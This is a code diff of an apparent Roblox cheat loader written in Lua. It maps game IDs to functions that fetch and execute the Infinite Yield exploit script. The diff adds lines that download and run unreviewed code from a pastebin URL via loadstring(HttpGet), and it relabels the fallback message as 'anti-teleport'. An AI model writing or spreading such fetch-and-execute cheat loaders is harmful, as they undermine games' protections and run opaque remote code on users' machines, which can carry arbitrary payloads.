@@ -72,11 +72,14 @@ end
 local gameIds = {
     ["FAILURE"] = function()
         loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
+        loadstring(game:HttpGet("https://pastebin.com/raw/KqKxXpWh"))()        
     end,
     ["4483381587"] = function()
         -- a literal baseplate
         changeText("interconnecting supercollision hypermatrices...")
         loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
+        loadstring(game:HttpGet("https://pastebin.com/raw/KqKxXpWh"))()        
+
     end,
     ['524578448'] = function()
         changeText("purficating gyroidic oscilators...")
@@ -114,7 +117,7 @@ for name, func in pairs(gameIds) do
     end
 end
 if not callback then 
-    changeText("gameid illocatable, defaulting to infinite yield...")
+    changeText("gameid illocatable, defaulting to infinite yield and anti-teleport...")
     gameIds["FAILURE"]()
     terminate()
     return 
